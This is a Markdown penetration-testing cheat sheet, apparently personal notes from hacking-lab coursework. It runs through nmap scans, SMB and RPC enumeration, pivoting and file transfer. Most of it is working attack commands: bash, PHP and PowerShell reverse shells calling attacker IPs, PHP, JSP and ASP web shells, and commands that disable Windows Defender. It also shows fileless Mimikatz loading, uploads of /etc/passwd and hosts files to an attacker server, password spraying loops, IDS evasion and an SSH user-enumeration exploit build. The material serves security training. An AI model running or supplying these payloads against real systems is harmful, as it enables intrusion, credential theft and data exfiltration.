ncat --send-only 192.168.49.128 8000 < SharpKatz.exe

# Attacker as server
sudo nc -l -p 443 -q 0 < SharpKatz.exe
# Victim downloads
nc 192.168.49.128 443 > SharpKatz.exe
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

---

## Nikto

```bash
nikto -h inlanefreight.com -Tuning b
```

---

## Nmap

### Basic Scans

SYN scan (stealth):
```bash
sudo nmap -p- --open -sS -T4 --min-rate 4500 -vvv -n -Pn -oG allPorts
```

TCP connect:
```bash
sudo nmap 10.129.2.28 -p 443 --packet-trace --disable-arp-ping -Pn -n --reason -sT
```

UDP:
```bash
sudo nmap -sU -T5 -Pn -n -F 10.129.2.32
```

Scripts + versions:
```bash
sudo nmap -p80,443,445,3309 -sCV 10.129.2.32 -oN targeted
```

### Host Discovery
```bash
sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5
sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20 | grep for | cut -d" " -f5
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```

### CopyPorts

CopyPorts directly to the clipboard:

```bash
function copyPorts(){
    file=$1
    ports="$(grep -oE '[0-9]+/open' ${file} | cut -d / -f1 | sort -un | tr '\n' ',' | sed 's/.$//')"

    wl-copy ${ports}
    
    echo ""
    echo "[+] Ports copied to clipboard!"
    echo "[>] ${ports}"
}
```

### Scripts by Service

SMB:
```bash
nmap --script smb-os-discovery.nse -p445 10.10.10.40
sudo nmap 192.168.10.243 -p445 -sV -sS -O --script 'vuln'
nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17-010
```

SMTP:
```bash
sudo nmap 10.129.14.128 -sC -sV -p25
sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
```

RDP:
```bash
nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
```

WinRM:
```bash
nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
```

IPMI:
```bash
sudo nmap -sU --script ipmi-version -p 623
```

Oracle TNS:
```bash
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

MSSQL:
```bash
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
```

HTTP enum:
```bash
nmap --script http-enum 10.10.10.10
nmap --script http-enum --script-args http-enum.basepath='/dev/'
```

Banner:
```bash
nmap -sV --script=banner -p21 10.10.10.0/24
```

### IDS/IPS Evasion

ACK scan:
```bash
nmap -sA <target>
```

Decoys:
```bash
sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5
```

Specific source IP:
```bash
sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0
```

Source port 53 (DNS proxying):
```bash
sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53
ncat -nv --source-port 53 10.129.2.28 50000
sudo nmap -n -sV -p50000 10.129.50.64 -Pn --source-port 53 -f -T1 -D RND:5
```

You can find the script in `/usr/share/nmap/scripts/`, in addition, you can create your own .nse scripts.

---

## ODAT (Oracle)

Installation:
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init && git submodule update
sudo pip3 install colorlog termcolor passlib python-libnmap pycryptodome openpyxl
```

Usage:
```bash
./odat.py -h
./odat.py all -s 10.129.204.235
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

---

## Onesixtyone

Brute force SNMP community strings:
```bash
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128
onesixtyone -c dict.txt 10.129.42.254
```

---

## OpenSSL

FTP with TLS:
```bash
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```

POP3/IMAP with TLS:
```bash
openssl s_client -connect 10.129.14.128:pop3s
openssl s_client -connect 10.129.14.128:imaps
```

Encrypt files:
```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

Self-signed certificate:
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

---

## Proxychains

Configure `/etc/proxychains.conf`:
```
socks4  127.0.0.1 9050
socks5  127.0.0.1 1080
```

Usage:
```bash
proxychains nmap -v -sn 172.16.5.1-200
proxychains nmap -v -Pn -sT 172.16.5.19
proxychains msfconsole
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
proxychains rdesktop -u victor -p "pass@123" 172.16.5.19 -d INLANEFREIGHT.LOCAL
proxychains firefox-esr 172.16.5.135:80
```

---

## RDP Clients

### xfreerdp
```bash
xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

To access the directory, we can connect to `\\tsclient\`, allowing us to transfer file to and from the RDP session. You can use the Network tab in the explorer file.

![Pasted image 20260623191726](images/Pasted%20image%2020260623191726.png)

An alternative for Windows is use mstsc.exe remote desktop client.
Local Resources > Local devices and resources, more > Drives

![Pasted image 20260623191829](images/Pasted%20image%2020260623191829.png)

### rdesktop
```bash
rdesktop -u htb-student -p HTB_@cademy_stdnt! 10.129.34.4
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

### rdp-sec-check
```bash
sudo cpan
install Encoding::BER
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
./rdp-sec-check.pl 10.129.201.248
```

---

## Responder / Inveigh

### Responder

```bash
sudo responder -I ens224
sudo responder -I ens224 -A      # passive/analyze mode
```

Flags: `-A` (analyze), `-wf` (WPAD proxy), `-f` (OS fingerprint), `-v` (verbose), `-w` (built-in WPAD)

Logs at: `/usr/share/responder/logs` — format `(MODULE)-(HASH_TYPE)-(CLIENT_IP).txt`

Ports that must be free:
```
UDP 137, 138, 53, 389 / TCP 1433, 1434, 80, 135, 139, 445, 21, 3141, 25, 110, 587, 3128 / Multicast UDP 5355, 5353
```

### Inveigh (Windows)

PowerShell:
```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

C#:
```
.\Inveigh.exe
GET NTLMV2UNIQUE
GET NTLMV2USERNAMES
```

---

## Rpcclient

Anonymous connection:
```bash
rpcclient -U "" 10.10.10.10 -N
rpcclient -U "" -N 172.16.5.5
```

With credentials:
```bash
rpcclient -U "user%password" 10.10.10.10
rpcclient -U "domain.local\user%password" 10.10.10.10
```

Single command:
```bash
rpcclient -U "user%pass" 10.10.10.10 -c 'enumdomusers'
```

Internal commands:
```
enumdomusers          # domain users
enumdomgroups         # groups
querygroupmem 0x200   # group members (RID)
queryuser 0x1f4       # user info by RID
querydispinfo         # all user descriptions
querydominfo          # domain info
getdompwinfo          # password policy
```

User descriptions in a loop:
```bash
for rid in $(rpcclient -U "domain.local\user%password" 10.10.10.10 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]'); do echo -e "\n[+] RID $rid:"; rpcclient -U "domain.local\user%password" 10.10.10.10 -c "queryuser $rid" | grep -E -i "user name|description"; done
```

RID brute force:
```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo ""; done
```

Password spraying:
```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

Null session (Windows):
```cmd
net use \\DC01\ipc$ "" /u:""
```

---

## Rsync

```bash
sudo nmap -sV -p 873 127.0.0.1
nc -nv 127.0.0.1 873
rsync -av --list-only rsync://127.0.0.1/dev
rsync -av rsync://127.0.0.1/dev
rsync -av -e ssh rsync://127.0.0.1/dev
rsync -av -e "ssh -p2222" rsync://127.0.0.1/dev
```

---

## Shells

### Reverse Shell

Bash:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

PHP:
```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'"); ?>
```

PowerShell:
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

Listener:
```bash
nc -nlvp 443
rlwrap nc -nlvp 4646
```

Resources: https://www.revshells.com/ | https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

### Bind Shell

Bash (victim):
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

Connect from attacker:
```bash
nc 10.10.10.1 1234
```

### Web Shell

PHP:
```php
<?php system($_REQUEST["cmd"]); ?>
```

JSP:
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

ASP:
```asp
<% eval request("cmd") %>
```

Execute:
```bash
curl http://SERVER_IP:PORT/shell.php?cmd=id
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

### Upgrading TTY

```bash
script /dev/null -c bash
# or
python -c 'import pty; pty.spawn("/bin/bash")'
```

`Ctrl+Z` → then:
```bash
stty raw -echo; fg
reset xterm
export TERM=xterm
stty size                         # get your terminal dimensions
stty rows 67 columns 318          # apply on remote shell
```

### Payload in Windows

```PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

If you're in a powershell you don't need to use `powershell -nop -c`.

In the server (attack machine)
```bash
sudo nc -lvnp 443
```

Disable Windows Defender Antivirus (AV)
```PowerShell
Set-MpPreference -DisableRealtimeMonitoring $true
```

### Useful resources

- Mythic C2 Framework: [Source](https://github.com/its-a-feature/Mythic)
- Nishang: [Source](https://github.com/samratashok/nishang). Framework collection of Offensive PowerShell implants and scripts.
- Darkarmour: [Source](https://github.com/bats3c/darkarmour). Is a tool to generate and utilize obfuscated binaries for use against Windows hosts.

web shells:

- laudanum repository of web shell: https://github.com/jbarcia/Web-Shells/tree/master/laudanum
- aspx Nishang: Offensive powershell for red team. https://github.com/samratashok/nishang
  - Antak-WebShell: Powerfull powershell webshell
- php web shell wwwolf: https://github.com/WhiteWinterWolf/wwwolf-php-webshell.

### Useful tips

CMD does not keep a record of the commands used during the session, however, powershell does.

Exuection Policy and User account Control (UAC) can inihibit your ability to execute commands and scripts. These affect to powershell but not to cmd.

---

## Smbclient

Null session:
```bash
smbclient -L 10.10.10.10 -N
```

Connect to share:
```bash
smbclient \\\\10.129.42.253\\users                  # guest
smbclient -U bob \\\\10.129.42.253\\users           # with credentials
```

Recursive download:
```bash
smbclient //<target>/<share> -U <user> -c 'recurse ON; prompt OFF; mget *'
```

Download everything with wget:
```bash
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
```

Commands: `cd`, `ls`, `get`, `put`

---

## Smbmap

View permissions:
```bash
smbmap -H 10.10.10.10
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

Recursive:
```bash
smbmap -H 10.10.10.10 -r shared_folder/folder2
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

Download:
```bash
smbmap -H 10.10.10.10 --download file
```

---

## Smtp-user-enum

```bash
smtp-user-enum -M VRFY -U users.txt -t 10.129.6.156
smtp-user-enum -M VRFY -U users.txt -t 10.129.6.156 -w 30
```

---

## Snmpwalk

```bash
snmpwalk -v2c -c public 10.129.14.128
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
snmpwalk -v 2c -c backup 10.129.19.54
snmpget -v2c -c backup 10.129.19.54 1.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4
snmp-check -c backup 10.129.19.54
```

---

## Socat

Reverse shell redirect (pivot Ubuntu → attacker):
```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Bind shell redirect (pivot Ubuntu → internal Windows):
```bash
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

---

## SQLplus (Oracle)

Install:
```bash
sudo apt install oracle-instantclient-sqlplus
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"; sudo ldconfig
sqlplus -v
```

Connect:
```bash
sqlplus scott/tiger@10.129.204.235/XE
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

Oracle commands:
```oracle
select table_name from all_tables;
select * from user_role_privs;
select name, password from sys.user$;
```

---

## SSH

Connect:
```bash
ssh user@server
chmod 600 id_rsa && ssh -i id_rsa user@server
```

Brute force / analysis:
```bash
ssh -v cry0l1t3@10.129.14.132
ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password
```

Generate keys:
```bash
ssh-keygen -f key
echo "ssh-rsa AAAA...= user@parrot" >> /root/.ssh/authorized_keys
ssh root@10.10.10.10 -i key
```

### Kerberos SSH

Edit `/etc/krb5.conf`:
```
[libdefaults]
    default_realm = REALCORP.HTB
[realms]
    REALCORP.HTB = { kdc = srv01.realcorp.htb }
[domain_realm]
    .REALCORP.HTB = REALCORP.HTB
```

```bash
sudo kdestroy
sudo kinit <username>
sudo klist
sudo ssh -o GSSAPIAuthentication=yes j.nakazawa@10.10.10.224
```

### SSH Port Forwarding

Local:
```bash
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

Dynamic SOCKS:
```bash
ssh -D 9050 ubuntu@10.129.202.64
```

Remote/Reverse:
```bash
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

### SCP

```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
scp plaintext@192.168.49.128:/root/myroot.txt .
```

### SSH bruteforce

You can use hydra
```
hydra -l user_or_userwordlist.txt -P <password_wordlist.txt> -t 4 ssh://<IP>
```

### SSH enumerate users > 7.7

It is possible to enumerate users with a ssh version before 7.7. The problem is that most of the script need specific condition, python2.7, paramiko library update a lot of and always break the syntax of the script...

My solution to this problem is create an environment prepare to use the official CVE-2018-15473 in Exploit-DB.

If you use SearchSploit. All of them have problems with python version and paramiko syntax.

| Script        | CVE        | Author / Date               | Technique                     | Scope                       | Paramiko attr           | Notable features                                                                                                                                             |
| ------------- | ---------- | --------------------------- | ----------------------------- | --------------------------- | ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **45210.py**  | 2018-15473 | Matthew Daley — 2018-08-16  | Malformed `publickey` packet  | Single user                 | `_handler_table`        | Original PoC. Minimal, clean reference implementation. No threading or output options.                                                                       |
| **45233.py**  | 2018-15473 | Justin Gardner — 2018-08-21 | Malformed `publickey` packet  | Single user **or** wordlist | `_handler_table`        | Full tool: multiprocessing (`--threads`), output formats (list/json/csv), retry logic on flood, restores `add_boolean` between connections. Python 2 syntax. |
| **45939.py**  | 2018-15473 | Leap Security — 2018-12-04  | Malformed `publickey` packet  | Single user                 | `_client_handler_table` | Clean rewrite. Uses the renamed attribute → **works with modern paramiko** where the other two fail.                                                         |
| **40136.py**  | 2016-6210  | 2016                        | Timing attack (long password) | Single user                 | N/A                     | Sends a very long password; measures response time. Requires `PasswordAuthentication`. Statistical, network-sensitive.                                       |
| **40113.txt** | 2016-6210  | 2016                        | Timing attack (long password) | N/A (advisory)              | N/A                     | Not an executable exploit — original advisory/paper describing the vuln with reference PoC.                                                                  |

One solution is download the following repository and do some changes:

https://github.com/Rhynorater/CVE-2018-15473-Exploit

You need to do some changes in the Dockerfile,
- `Alpine:edge` -> `Alpine:3.11`
- paramiko version

Dockerfile:
```
FROM alpine:3.11
LABEL maintainer "Ilya Glotov <ilya@ilyaglotov.com>"

ENV PYTHONWARNINGS="ignore"

RUN apk add --update --no-cache --virtual .deps build-base \
                                                libffi-dev \
                                                py-pip \
                                                python-dev \
  && apk add --no-cache openssl-dev \
                        python \
  && pip install cffi==1.14.6 cryptography==2.8 paramiko==2.0.8 \
  && apk del .deps

COPY sshUsernameEnumExploit.py /sshUsernameEnumExploit.py

RUN chmod +x /sshUsernameEnumExploit.py

ENTRYPOINT ["python", "sshUsernameEnumExploit.py"]

```

```bash
docker build -t cve-2018-15473 .
```

If you have to rebuild you need to use `--no-cache` parameter

Execute the script:

```bash
docker run cve-2018-15473 -h
```

You need to create a volume in the docker container to find the wordlist
```bash
docker run -v /usr/share/wordlists:/wordlists cve-2018-15473 --userList /wordlists/seclists/Usernames/xato-net-10-million-usernames.txt 10.129.46.229
```

You can see more in the following fork of the original process
https://github.com/sergiky/CVE-2018-15473-Exploit-docker

```bash
docker ps -a | awk '$2 == "cve-2018-15473" {print $1}' | xargs docker rm docker rmi cve-2018-15473
```

Delete images
```bash
docker rmi -f $(docker images -q)
```

---

## Sshuttle

```bash
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn
```

---

## Subfinder

```bash
subfinder -d inlanefreight.com
```

---

## Wafw00f

```bash
wafw00f inlanefreight.com
```

---

## Whatweb

```bash
whatweb --no-errors 10.10.10.0/24
```

---

## Wireshark & Tcpdump

```bash
sudo -E wireshark
sudo tcpdump -i ens224
```

---

## File Transfer Methods

### Python HTTP Server

```bash
python3 -m http.server 80
python2.7 -m SimpleHTTPServer
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000
```

Download on victim:
```bash
wget http://x/linenum.sh
curl http://x/linenum.sh -o linenum.sh
```

### Upload Server (uploadserver)

```bash
pip3 install uploadserver
python3 -m uploadserver
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

Upload from victim (PowerShell PSUpload.ps1):
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

Upload from victim (Linux):
```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' --insecure
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

### Nginx PUT Upload (receive files over HTTP)

```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

Nginx config (`/etc/nginx/sites-available/upload.conf`):
```nginx
server {
    listen 9001;
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

```bash
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo systemctl restart nginx.service
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

### PowerShell Downloads

```powershell
(New-Object Net.WebClient).DownloadFile('https://url/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
IEX (New-Object Net.WebClient).DownloadString('https://url/Invoke-Mimikatz.ps1')
Invoke-WebRequest https://url -OutFile PowerView.ps1
Invoke-WebRequest https://url -UseBasicParsing | IEX
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}   # bypass SSL
```

### Changing User Agent

If administrators have blacklisted any of these User Agents, Invoke-WebRequest contains a UserAgent parameter.

Listing User-Agents:
```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
```

```powershell
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

### Base64 (bypass firewall)

Linux → Victim:
```bash
cat id_rsa | base64 -w 0; echo
# On victim:
echo -n 'BASE64' | base64 -d > id_rsa
```

Windows → Attacker:
```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
# On Linux:
echo BASE64 | base64 -d > hosts
```

PowerShell decode:
```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("BASE64STRING"))
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

### SMB

```bash
# Attacker server
sudo impacket-smbserver share -smb2support /tmp/smbshare
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```powershell
# Windows victim
copy \\192.168.220.133\share\nc.exe
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
copy C:\Users\john\Desktop\file.zip \\192.168.49.129\DavWWWRoot\
```

### FTP

```bash
# Attacker server
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
# Victim
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

### Linux Direct Downloads

```bash
wget https://url/LinEnum.sh -O /tmp/LinEnum.sh
curl -o /tmp/LinEnum.sh https://url/LinEnum.sh
curl https://url/LinEnum.sh | bash   # fileless
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
cat <&3
```

### WebDAV (SMB upload over HTTP)

```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```powershell
dir \\192.168.49.128\DavWWWRoot
copy C:\Users\john\Desktop\file.zip \\192.168.49.129\DavWWWRoot\
```

### Encrypted Transfers

Windows:
```powershell
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```

Linux:
```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

### Multi-Language Downloads

```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://url/LinEnum.sh", "LinEnum.sh")'
php -r '$file = file_get_contents("https://url/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://url/LinEnum.sh")))'
perl -e 'use LWP::Simple; getstore("https://url/LinEnum.sh", "LinEnum.sh");'
```

### LOLBins for File Transfer (Windows)

```powershell
# GfxDownloadWrapper (Intel driver LOLBIN)
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

More LOLBins: https://lolbas-project.github.io/#/download

---

## Windows Port Forwarding

### Netsh
```powershell
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
netsh.exe interface portproxy show v4tov4
xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123
```

### Plink.exe (PuTTY)
```bash
plink -ssh -D 9050 ubuntu@10.129.15.50
```

We have [Proxifier](https://www.proxifier.com) tool to create a tunneled network through SOCKS or HTTPS proxy.

![Pasted image 20260716190120](images/Pasted%20image%2020260716190120.png)

You can configure the SOCKS server with 127.0.0.1 and port 9050. Then, you can directly start`mstsc.exe` to start an RDP session with a Windows target that allows RDP connections.

### Rpivot
```bash
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
python2 client.py --server-ip 10.10.14.18 --server-port 9999
proxychains firefox-esr 172.16.5.135:80
```

With NTLM proxy:
```bash
python client.py --server-ip <IP> --server-port 8080 --ntlm-proxy-ip <ProxyIP> --ntlm-proxy-port 8081 --domain <domain> --username <user> --password <pass>
```

### DNScat2
```bash
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

PowerShell (victim):
```powershell
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

### Ptunnel-ng (ICMP tunneling)
```bash
# Pivot host
sudo ./ptunnel-ng -r10.129.202.64 -R22

# Attacker
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
ssh -p2222 -lubuntu 127.0.0.1
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
proxychains nmap -sV -sT 172.16.5.19 -p3389
```

### SocksOverRDP
```cmd
regsvr32.exe SocksOverRDP-Plugin.dll
netstat -antb | findstr 1080
```

---

## System Commands

### Windows
```cmd
dir -Force                                                   # hidden files
findStr /i "TCP"                                             # like grep
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"   # autologin
netstat -r                                                   # routing table
net accounts                                                  # password policy
net use \\DC01\ipc$ "" /u:""                                  # null session
```

PowerShell security:
```powershell
Get-MpComputerStatus                                         # Windows Defender status
Set-MpPreference -DisableRealtimeMonitoring $true            # disable Defender
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
$ExecutionContext.SessionState.LanguageMode                   # language mode
Import-Module .\PowerView.ps1; Get-DomainPolicy
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers
```

### Linux
```bash
find / -perm -4000 -type f 2>/dev/null    # SUID binaries
sudo -l                                    # sudo privileges
getcap -r / 2>/dev/null                   # capabilities
sudo --version                            # sudo version (search for exploits)
dpkg -l                                   # installed software
```

### Important Paths

| System | Path |
|--------|------|
| Windows hosts | `C:\Windows\System32\drivers\etc\hosts` |
| Windows web IIS | `C:\inetpub\wwwroot` |
| Windows temp | `C:\Windows\Temp` |
| Linux web | `/var/www/html` |
| Linux cron | `/etc/crontab`, `/etc/cron.d` |
| Linux SSH keys | `/home/user/.ssh/id_rsa`, `/root/.ssh/id_rsa` |

---

## NFS

TCP/UDP ports 111 and 2049.

```bash
showmount -e 10.129.14.128                                  # list NFS mounts

mkdir target-NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock   # mount NFS share
ls -l mnt/nfs/                                              # list with names
ls -n mnt/nfs/                                              # list with UIDs/GIDs

sudo umount ./target-NFS                                     # unmount
```

---

## SMTP / IMAP / POP3

**SMTP** — ports 25, 587, 465.

```bash
telnet 10.129.14.128 25
EHLO inlanefreight.htb
VRFY root                                                    # verify user
MAIL FROM: attacker@domain.com
RCPT TO: victim@domain.com NOTIFY=success,failure
DATA
.
QUIT

smtp-user-enum -M VRFY -U users.txt -t 10.129.6.156        # enumerate users
smtp-user-enum -M VRFY -U users.txt -t 10.129.6.156 -w 30  # with extended timeout

sudo nmap 10.129.14.128 -sC -sV -p25                        # nmap scripts
sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v    # detect open relay

# Proxy via CONNECT:
CONNECT 10.129.14.128:25 HTTP/1.0
```

**IMAP** — ports 143, 993 (TLS).

```bash
curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd        # list mailboxes
openssl s_client -connect 10.129.14.128:imaps               # TLS connection

# IMAP commands:
1 LOGIN username password
1 LIST "" *
1 SELECT INBOX
1 FETCH <ID> all
1 FETCH <ID> BODY[]
1 LOGOUT
```

**POP3** — ports 110, 995 (TLS).

```bash
openssl s_client -connect 10.129.14.128:pop3s               # TLS connection

# POP3 commands:
USER username
PASS password
STAT
LIST
RETR id
DELE id
QUIT
```

### SMTP Apache James Server 2.3.2

The default credential of port 4555 is root:root, if you can access you can create, list , change password of users among other things. With this, for example, you can read the email of some users

There is an exploit that give a shell when something log in in the system (for example, via ssh).

#### Interact IMAP with TLS

```bash
openssl s_client -connect 10.129.14.128:imaps
```

#### IMAP commands

You usually have to add a tag to identify the command, e.g: `tag_simple LOGIN username password`.

|                                 |                                                                                                               |
| ------------------------------- | ------------------------------------------------------------------------------------------------------------- |
| `1 LOGIN username password`     | User's login.                                                                                                 |
| `1 LIST "" *`                   | Lists all directories.                                                                                        |
| `1 CREATE "INBOX"`              | Creates a mailbox with a specified name.                                                                      |
